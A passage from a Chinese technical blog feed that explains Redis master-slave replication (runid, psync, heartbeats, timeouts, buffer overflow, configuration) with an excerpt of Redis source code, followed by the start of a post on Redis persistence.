title="服务器运行ID(runid)"></a>服务器运行ID(runid)</h5><p>每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic16.png"><p>主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：</p><ul><li>如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)；</li><li>如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。</li></ul><h4 id="psync命令的执行"><a href="#psync命令的执行" class="headerlink" title="psync命令的执行"></a>psync命令的执行</h4><p>在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。</p><p>psync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic17.png"><p>首先，从节点根据当前状态，决定如何调用psync命令：</p><ul><li>如果从节点之前未执行过slaveof或最近执行了slaveof no one，则从节点发送命令为psync ? -1，向主节点请求全量复制；</li><li>如果从节点之前执行了slaveof，则发送命令为psync [runid] [offset]，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。</li></ul><p>主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：</p><ul><li>如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制；</li><li>如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可；</li><li>如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC [runid] [offset]，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。</li></ul><h4 id="部分复制演示"><a href="#部分复制演示" class="headerlink" title="部分复制演示"></a>部分复制演示</h4><p>在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。</p><p><strong>网络中断</strong></p><p>网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。</p><p>主节点日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic18.png"><p>从节点日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic19.png"><p><strong>网络恢复</strong></p><p>网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。</p><p>主节点日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic20.png"><p>从节点日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic21.png"><h3 id="命令传播阶段-心跳机制"><a href="#命令传播阶段-心跳机制" class="headerlink" title="命令传播阶段 - 心跳机制"></a>命令传播阶段 - 心跳机制</h3><p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。心跳机制对于主从复制的超时判断、数据安全等有作用。</p><h4 id="主-gt-从：PING"><a href="#主-gt-从：PING" class="headerlink" title="主-&gt;从：PING"></a>主-&gt;从：PING</h4><p>每隔指定的时间，<strong>主节点会向从节点发送PING命令</strong>，这个PING命令的作用，主要是为了让从节点进行超时判断。</p><p>PING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。</p><p>关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic22.png"><p>但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic23.png"><h4 id="从-gt-主：REPLCONF-ACK"><a href="#从-gt-主：REPLCONF-ACK" class="headerlink" title="从-&gt;主：REPLCONF ACK"></a>从-&gt;主：REPLCONF ACK</h4><p>在命令传播阶段，从节点会向主节点发送REPLCONF ACK命令，频率是每秒1次；命令格式为：REPLCONF ACK {offset}，其中offset指从节点保存的复制偏移量。REPLCONF ACK命令的作用包括：</p><p>（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用info Replication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONF ACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic24.png"><p>（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。<strong>注意，offset和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。</strong></p><p>（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONF ACK命令的时间来判断的，即前面所说的info Replication中的lag值。</p><h3 id="应用中的问题"><a href="#应用中的问题" class="headerlink" title="应用中的问题"></a>应用中的问题</h3><h4 id="读写分离及其中的问题"><a href="#读写分离及其中的问题" class="headerlink" title="读写分离及其中的问题"></a>读写分离及其中的问题</h4><p>在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。</p><h5 id="延迟与不一致问题"><a href="#延迟与不一致问题" class="headerlink" title="延迟与不一致问题"></a>延迟与不一致问题</h5><p>前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。</p><p>在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。</p><h5 id="数据过期问题"><a href="#数据过期问题" class="headerlink" title="数据过期问题"></a>数据过期问题</h5><p>在单机版Redis中，存在两种删除策略：</p><ul><li>惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。</li><li>定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。</li></ul><p>在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。</p><p>Redis 3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。</p><h5 id="故障切换问题"><a href="#故障切换问题" class="headerlink" title="故障切换问题"></a>故障切换问题</h5><p>在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。</p><h4 id="复制超时问题"><a href="#复制超时问题" class="headerlink" title="复制超时问题"></a>复制超时问题</h4><p>主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。</p><h5 id="超时判断意义"><a href="#超时判断意义" class="headerlink" title="超时判断意义"></a>超时判断意义</h5><p>在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：</p><ul><li>如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。</li><li>如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。</li></ul><h5 id="判断机制"><a href="#判断机制" class="headerlink" title="判断机制"></a>判断机制</h5><p>主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：</p><ul><li>主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONF ACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。</li><li>从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：<ul><li>如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接；</li><li>如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接；</li><li>如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。</li><li>主从节点判断连接超时的相关源代码如下：</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Replication cron function, called 1 time per second. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replicationCron</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span> replication_cron_loops = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Non blocking connection timeout? */</span></span><br><span class="line">    <span class="keyword">if</span> (server.masterhost &amp;&amp;</span><br><span class="line">        (server.repl_state == REDIS_REPL_CONNECTING ||</span><br><span class="line">         slaveIsInHandshakeState()) &amp;&amp;</span><br><span class="line">         (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)</span><br><span class="line">    &#123;</span><br><span class="line">        redisLog(REDIS_WARNING,<span class="string">"Timeout connecting to the MASTER..."</span>);</span><br><span class="line">        undoConnectWithMaster();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Bulk transfer I/O timeout? */</span></span><br><span class="line">    <span class="keyword">if</span> (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_TRANSFER &amp;&amp;</span><br><span class="line">        (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)</span><br><span class="line">    &#123;</span><br><span class="line">        redisLog(REDIS_WARNING,<span class="string">"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value."</span>);</span><br><span class="line">        replicationAbortSyncTransfer();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Timed out master when we are an already connected slave? */</span></span><br><span class="line">    <span class="keyword">if</span> (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_CONNECTED &amp;&amp;</span><br><span class="line">        (time(NULL)-server.master-&gt;lastinteraction) &gt; server.repl_timeout)</span><br><span class="line">    &#123;</span><br><span class="line">        redisLog(REDIS_WARNING,<span class="string">"MASTER timeout: no data nor PING received..."</span>);</span><br><span class="line">        freeClient(server.master);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//此处省略无关代码……</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Disconnect timedout slaves. */</span></span><br><span class="line">    <span class="keyword">if</span> (listLength(server.slaves)) &#123;</span><br><span class="line">        listIter li;</span><br><span class="line">        listNode *ln;</span><br><span class="line">        listRewind(server.slaves,&amp;li);</span><br><span class="line">        <span class="keyword">while</span>((ln = listNext(&amp;li))) &#123;</span><br><span class="line">            redisClient *slave = ln-&gt;value;</span><br><span class="line">            <span class="keyword">if</span> (slave-&gt;replstate != REDIS_REPL_ONLINE) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (slave-&gt;flags &amp; REDIS_PRE_PSYNC) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> ((server.unixtime - slave-&gt;repl_ack_time) &gt; server.repl_timeout)</span><br><span class="line">            &#123;</span><br><span class="line">                redisLog(REDIS_WARNING, <span class="string">"Disconnecting timedout slave: %s"</span>,</span><br><span class="line">                    replicationGetSlaveName(slave));</span><br><span class="line">                freeClient(slave);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//此处省略无关代码……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="需要注意的坑"><a href="#需要注意的坑" class="headerlink" title="需要注意的坑"></a>需要注意的坑</h5><p>下面介绍与复制阶段连接超时有关的一些实际问题：</p><p>（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。</p><p>（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。</p><p>（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys *或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时</p><h4 id="复制中断问题"><a href="#复制中断问题" class="headerlink" title="复制中断问题"></a>复制中断问题</h4><p>主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题.</p><h5 id="复制缓冲区溢出"><a href="#复制缓冲区溢出" class="headerlink" title="复制缓冲区溢出"></a>复制缓冲区溢出</h5><p>前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制-&gt;复制缓冲区溢出导致连接中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致连接中断……的循环。</p><p>复制缓冲区的大小由client-output-buffer-limit slave {hard limit} {soft limit} {soft seconds}配置，默认值为client-output-buffer-limit slave 256MB 64MB 60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过config set命令动态配置的（即不重启Redis也可以生效）。</p><p>当复制缓冲区溢出时，主节点打印日志如下所示：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic25.png"><p><strong>需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。</strong></p><h4 id="各场景下复制的选择及优化技巧"><a href="#各场景下复制的选择及优化技巧" class="headerlink" title="各场景下复制的选择及优化技巧"></a>各场景下复制的选择及优化技巧</h4><p>在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。</p><h5 id="第一次建立复制"><a href="#第一次建立复制" class="headerlink" title="第一次建立复制"></a>第一次建立复制</h5><p>此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。</p><h5 id="主节点重启"><a href="#主节点重启" class="headerlink" title="主节点重启"></a>主节点重启</h5><p>主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。</p><p><strong>主节点宕机</strong></p><p>主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。</p><p>实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。</p><p><strong>安全重启：debug reload</strong></p><p>在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。</p><p>为了解决这个问题，Redis提供了debug reload的重启方式：重启后，主节点的runid和offset都不受影响，避免了全量复制。</p><p>如下图所示，debug reload重启后runid和offset都未受影响：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic26.png"><p>但debug reload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。</p><h5 id="从节点重启"><a href="#从节点重启" class="headerlink" title="从节点重启"></a>从节点重启</h5><p>从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。</p><h5 id="网络中断"><a href="#网络中断" class="headerlink" title="网络中断"></a>网络中断</h5><p>如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。</p><p>第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONF ACK来补充丢失的数据即可。</p><p>第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。</p><p>第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。</p><h4 id="复制相关的配置"><a href="#复制相关的配置" class="headerlink" title="复制相关的配置"></a>复制相关的配置</h4><p>这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。</p><p>配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。</p><h5 id="与主从节点都有关的配置"><a href="#与主从节点都有关的配置" class="headerlink" title="与主从节点都有关的配置"></a>与主从节点都有关的配置</h5><p>首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：</p><ul><li>slaveof <masterip> <masterport>：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。</masterport></masterip></li><li>repl-timeout 60：与各个阶段主从节点连接超时判断有关，见前面的介绍。</li></ul><h5 id="主节点相关配置"><a href="#主节点相关配置" class="headerlink" title="主节点相关配置"></a>主节点相关配置</h5><ul><li>repl-diskless-sync no：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。</li><li>repl-diskless-sync-delay 5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输 (2)多个从节点有较大的概率在短时间内建立主从复制。</li><li>client-output-buffer-limit slave 256MB 64MB 60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。</li><li>repl-disable-tcp-nodelay no：与命令传播阶段的延迟有关，见前面的介绍。</li><li>masterauth <master-password>：与连接建立阶段的身份验证有关，见前面的介绍。</master-password></li><li>repl-ping-slave-period 10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。</li><li>repl-backlog-size 1mb：复制积压缓冲区的大小，见前面的介绍。</li><li>repl-backlog-ttl 3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行全量复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。</li><li>min-slaves-to-write 3与min-slaves-max-lag 10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。</li></ul><h5 id="从节点相关配置"><a href="#从节点相关配置" class="headerlink" title="从节点相关配置"></a>从节点相关配置</h5><ul><li>slave-serve-stale-data yes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。</li><li>slave-read-only yes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。</li></ul><h4 id="单机内存大小限制"><a href="#单机内存大小限制" class="headerlink" title="单机内存大小限制"></a>单机内存大小限制</h4><p>在 <a href="/2019/04/04/深入学习Redis之持久化/">深入学习Redis之持久化</a> 一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：</p><p>（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。</p><p>（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。</p><p>（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制-&gt;复制缓冲区溢出导致复制中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致复制中断……的循环。</p><p>（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制-&gt;超时导致复制中断-&gt;重连-&gt;全量复制-&gt;超时导致复制中断……的循环。</p><p>此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。</p><h4 id="info-Replication"><a href="#info-Replication" class="headerlink" title="info Replication"></a>info Replication</h4><p>在Redis客户端通过info Replication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。</p><p>主节点：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic26.png"><p>从节点：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic27.png"><p>对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。</p><p>info Replication中展示的大部分内容在文章中都已经讲述，这里不再详述。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>下面回顾一下本文的主要内容：</p><ul><li>主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。</li><li>主从复制的操作：即slaveof命令。</li><li>主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONF ACK命令互相进行心跳检测。</li><li>应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limit slave等对解决Redis主从复制中出现的问题可能会有帮助。</li></ul><p>主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，将在后面的文章中介绍。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入学习Redis之持久化</title>
      <link href="/2019/04/05/2019-04-05-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2019/04/05/2019-04-05-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> RDB持久化与AOF持久化 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="Redis高可用概述"><a href="#Redis高可用概述" class="headerlink" title="Redis高可用概述"></a>Redis高可用概述</h3><p>在介绍Redis高可用之前，先说明一下在Redis的语境中高可用的含义。</p><p>我们知道，在web服务器中，高可用是指服务器可以正常访问的时间，衡量的标准是在多长时间内可以提供正常服务（99.9%、99.99%、99.999% 等等）。但是在Redis语境中，高可用的含义似乎要宽泛一些，除了保证提供正常服务(如主从分离、快速容灾技术)，还需要考虑数据容量的扩展、数据安全不会丢失等。</p><p>在Redis中，实现高可用的技术主要包括持久化、复制、哨兵和集群，下面分别说明它们的作用，以及解决了什么样的问题。</p><ul><li>持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。</li><li>复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。（缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制）</li><li>哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。</li><li>集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。</li></ul><h3 id="什么是持久化？"><a href="#什么是持久化？" class="headerlink" title="什么是持久化？"></a>什么是持久化？</h3><blockquote><p>持久化（Persistence），即把数据（如内存中的对象）保存到可永久保存的存储设备中（如磁盘）。持久化的主要应用是将内存中的对象存储在数据库中，或者存储在磁盘文件中、XML数据文件中等等。持久化是将程序数据在持久状态和瞬时状态间转换的机制。  